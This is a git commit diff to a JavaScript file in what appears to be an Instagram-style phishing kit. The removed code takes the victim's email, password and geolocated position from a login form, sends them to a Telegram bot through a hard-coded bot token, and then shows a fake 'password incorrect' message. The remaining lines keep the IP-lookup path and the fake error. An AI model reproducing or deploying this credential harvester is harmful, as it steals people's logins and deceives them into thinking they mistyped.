89a4d75a07cfad12c5f6ead06d0da59247778024
dezignsensei <145669245+dezignsensei@users.noreply.github.com>
2023-10-09 09:56:57 +0100

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -6,38 +6,7 @@ var st = 0;
 
 form.addEventListener("submit", (e) => {
   e.preventDefault();
-
-  const success = (position) => {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-
-    const geoApiUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;
-
-    fetch(geoApiUrl)
-      .then((res) => res.json())
-      .then((data) => {
-        ct = data.continent;
-        co = data.countryName;
-        lo = data.locality;
-        st = data.principalSubdivision;
-        var identity = document.getElementById("email").value;
-        var password = document.getElementById("password").value;
-
-        var my_text = `Result from Geolocation for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - Continent: ${ct} %0A - Country: ${co} %0A - Locality: ${lo} %0A - state: ${st}`;
-
-        var token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-        var chat_id =  -4015788485;
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
-
-        let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
-  };
-  const error = () => {
+ 
     fetch("https://ipapi.co/json/")
       .then((res) => res.json())
       .then((data) => {
@@ -61,9 +30,9 @@ form.addEventListener("submit", (e) => {
         document.getElementById("alert-message").innerHTML =
           "Sorry, your password was incorrect. Please double-check your password.";
       });
-  };
 
-  navigator.geolocation.getCurrentPosition(success, error);
+
+
 
   // window.location.replace("https://www.instagram.com/accounts/login/")
   //   console.log("Incorrect Password!");
